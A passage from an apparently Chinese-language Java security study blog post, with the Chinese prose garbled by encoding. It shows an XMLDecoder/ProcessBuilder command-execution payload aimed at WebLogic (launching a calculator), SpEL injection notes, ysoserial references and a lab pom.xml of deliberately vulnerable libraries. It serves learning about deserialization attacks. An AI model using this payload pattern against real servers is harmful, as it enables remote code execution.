<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt;</span><br><span class="line">            &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                &lt;string&gt;Calc&lt;/string&gt;</span><br><span class="line">            &lt;/void&gt;</span><br><span class="line">        &lt;/array&gt;</span><br><span class="line">        &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨processbuilderå»å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p>â†‘ç›¸å½“äºæ‰§è¡Œä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = new String[1];</span><br><span class="line">cmd[0] = &quot;Calc&quot;;</span><br><span class="line">new ProcessBuilder(cmd).start();</span><br></pre></td></tr></table></figure>

<p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0ã€‚</p>
<h1 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h1><ul>
<li><code>#&#123;&#125;</code> å°±æ˜¯ SpEL çš„å®šç•Œç¬¦ï¼Œç”¨äºæŒ‡æ˜å†…å®¹æœª SpEL è¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼›</li>
<li><code>$&#123;&#125;</code> ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼ï¼›</li>
</ul>
<p><code>?.</code> ç¬¦å·ä¼šç¡®ä¿å·¦è¾¹çš„è¡¨è¾¾å¼ä¸ä¼šä¸º <code>null</code>ï¼Œå¦‚æœä¸º <code>null</code> çš„è¯å°±ä¸ä¼šè°ƒç”¨ <code>toUpperCase()</code> æ–¹æ³•äº†ã€‚</p>
<h2 id="Expression-å½¢å¼çš„-SpEL-è¡¨è¾¾å¼æ³¨å…¥"><a href="#Expression-å½¢å¼çš„-SpEL-è¡¨è¾¾å¼æ³¨å…¥" class="headerlink" title="Expression å½¢å¼çš„ SpEL è¡¨è¾¾å¼æ³¨å…¥"></a>Expression å½¢å¼çš„ SpEL è¡¨è¾¾å¼æ³¨å…¥</h2><ul>
<li><strong>ExpressionParser æ¥å£</strong>ï¼šè¡¨ç¤ºè§£æå™¨ï¼Œ</li>
<li><strong>EvaluationContext æ¥å£</strong>ï¼šè¡¨ç¤ºä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œ</li>
<li><strong>Expression æ¥å£</strong>ï¼šè¡¨ç¤ºè¡¨è¾¾å¼å¯¹è±¡ï¼Œ</li>
</ul>
<h1 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p>
<p>F:&#x2F;ctf-tool&#x2F;ctf&#x2F;t&#x2F;lz&#x2F;cc&#x2F;c1&#x2F;cc1&#x2F;ser.bin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\ctf-tool\ctf\t\lz\cc\c1\cc1\target\classes\org\example\call.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\\ctf-tool\\ctf\\t\\lz\\cc\\c1\\cc1\\target\\classes\\org\\example\\call.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Drun1baby/JavaSecurityLearning</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bç«™ç™½æ—¥æ¢¦ç»„é•¿</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads</span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="pom-xml-1"><a href="#pom-xml-1" class="headerlink" title="pom.xml"></a>pom.xml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">		 xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">	&lt;parent&gt;</span><br><span class="line">		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">		&lt;version&gt;2.7.11&lt;/version&gt;</span><br><span class="line">		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">	&lt;/parent&gt;</span><br><span class="line">	&lt;groupId&gt;com.example&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;javaGuide&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">	&lt;name&gt;javaGuide&lt;/name&gt;</span><br><span class="line">	&lt;description&gt;javaGuide&lt;/description&gt;</span><br><span class="line">	&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">			&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.83&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.nibblesec&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;serialkiller&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;0.4&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">			&lt;dependency&gt;</span><br><span class="line">				&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;2.18.3&lt;/version&gt;</span><br><span class="line">			&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;8.0.45&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;tomcat-util&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;8.5.64&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">			&lt;dependency&gt;</span><br><span class="line">				&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">			&lt;/dependency&gt;</span><br><span class="line">			&lt;dependency&gt;</span><br><span class="line">				&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">			&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.9&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.0.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.1.5&lt;/version&gt; &lt;!-- é€‰æ‹©ä¸€ä¸ªç¨³å®šçš„ç‰ˆæœ¬ --&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.29.2-GA&lt;/version&gt; &lt;!-- è¯·æ ¹æ®éœ€è¦é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬ --&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.rometools&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.1.0&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.9.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-aop&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.2.0.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-web&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.3.4&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.63&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.liferay&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;com.sun.syndication&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.0.LIFERAY-PATCHED-1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.48&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.18&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.12&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;0.9.5.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-messaging&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.3.28&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-integration-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.2.7.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">	&lt;/dependencies&gt;</span><br><span class="line">	&lt;properties&gt;</span><br><span class="line">		&lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">		&lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">	&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>


</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/">http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THMç¬”è®°"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">THMç¬”è®°</div></div><div class="info-2"><div class="info-item-1">THMç¬”è®°éƒ¨åˆ†å¤ªè¿‡ç®€å•å°±ä¸å†è®°å½• Mediumä¸Šæœ‰å¾ˆå¤šwpï¼Œå¯ä»¥å€Ÿé‰´ åŸºç¡€çŸ¥è¯†IPInternet protocol  ç½‘ç»œåœ°å€192.168.1.1 ä¸»æœºåœ°å€192.168.1.101 é»˜è®¤ç½‘å…³192.168.1.255 å‘åˆ«çš„ç½‘å…³å‘é€æ•°æ®    MACåœ°å€Media Access Control å‰6ä¸ªå­—ç¬¦ä»£è¡¨åˆ¶é€ ç½‘ç»œæ¥å£çš„å…¬ç§ï¼Œåå…­ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªå”¯ä¸€çš„æ•°å­— LANè¿æ¥æ–¹å¼æ‹“æ‰‘(Topology  æ˜Ÿå‹ é€šè¿‡äº¤æ¢æœºæˆ–é›†çº¿å™¨è¿æ¥ æ·»åŠ æ–¹ä¾¿ï¼Œæˆæœ¬é«˜ï¼Œä¸é€‚åˆå¤§è§„æ¨¡   æ€»çº¿æ‹“æ‰‘ æœ‰ä¸»å¹²ç”µç¼†ï¼Œ æˆæœ¬ä½ï¼Œæ’æŸ¥å›°éš¾   ç¯å½¢æ‹“æ‰‘ ä¸€ä¸ªåå°±å…¨å®Œ       ç‰¹æ€§ é›†çº¿å™¨ï¼ˆHubï¼‰ äº¤æ¢æœºï¼ˆSwitchï¼‰ ä¸­ç»§å™¨ï¼ˆRepeaterï¼‰    å·¥ä½œå±‚æ¬¡ ç‰©ç†å±‚ï¼ˆLayer 1ï¼‰ æ•°æ®é“¾è·¯å±‚ï¼ˆLayer 2ï¼‰ ç‰©ç†å±‚ï¼ˆLayer 1ï¼‰   æ•°æ®ä¼ è¾“ å¹¿æ’­æ‰€æœ‰ç«¯å£ æ ¹æ® MAC åœ°å€å®šå‘è½¬å‘ æ”¾å¤§å¹¶è½¬å‘ä¿¡å·   å¸¦å®½ æ‰€æœ‰ç«¯å£å…±äº«å¸¦å®½ æ¯ä¸ªç«¯å£ç‹¬ç«‹å¸¦å®½ æ— å¸¦å®½æ¦‚å¿µï¼Œä»…ç”¨äºä¿¡å·æ”¾å¤§   æ™ºèƒ½ æ— æ™ºèƒ½ï¼Œä»…è½¬å‘æ•°æ® æ™ºèƒ½è½¬å‘æ•°æ®ï¼Œé¿å…å¹¿æ’­ æ— æ™ºèƒ½ï¼Œä»…æ”¾å¤§ä¿¡å·   ARPAddress Resolution...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024ç¬¬ä¸€åœºciscn-ctfshowå¤ç°"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2024ç¬¬ä¸€åœºciscn-ctfshowå¤ç°</div></div><div class="info-2"><div class="info-item-1">2024ciscnç¬¬ä¸€åœºæœ¬ç« å†…å®¹å‡åœ¨ctfshowå¤ç° sanicpythonæ±¡æŸ“ æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a><a class="pagination-related" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024é¹ç¨‹æ¯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-17</div><div class="info-item-2">2024é¹ç¨‹æ¯</div></div><div class="info-2"><div class="info-item-1">é¹ç¨‹æ¯pythonå£ç®—1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport re# å‘é€ GET è¯·æ±‚è·å–ç®—å¼def get_calculation_problem(url):    response = requests.get(url)    if response.status_code == 200:        return response.text    else:        print(&quot;Failed to retrieve the calculation problem&quot;)        return None# è§£æç®—å¼å¹¶è®¡ç®—ç­”æ¡ˆdef calculate_answer(problem):    # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–ç®—å¼    #calculation = re.search(r&#x27;&lt;h1&gt;(.+?)&lt;/h1&gt;&#x27;,...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025å…ƒæ—¦æ¸—é€èµ›å¤ç°-ctfshow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2025å…ƒæ—¦æ¸—é€èµ›å¤ç°-ctfshow</div></div><div class="info-2"><div class="info-item-1">2025ctfshowå…ƒæ—¦æ¸—é€èµ›ç¬¬ä¸€ç« flag1-å‹ç¼©åŒ…å‹ç¼©åŒ…å¯†ç çˆ†ç ´  flag2-å›¾ç‰‡-å¯†ç 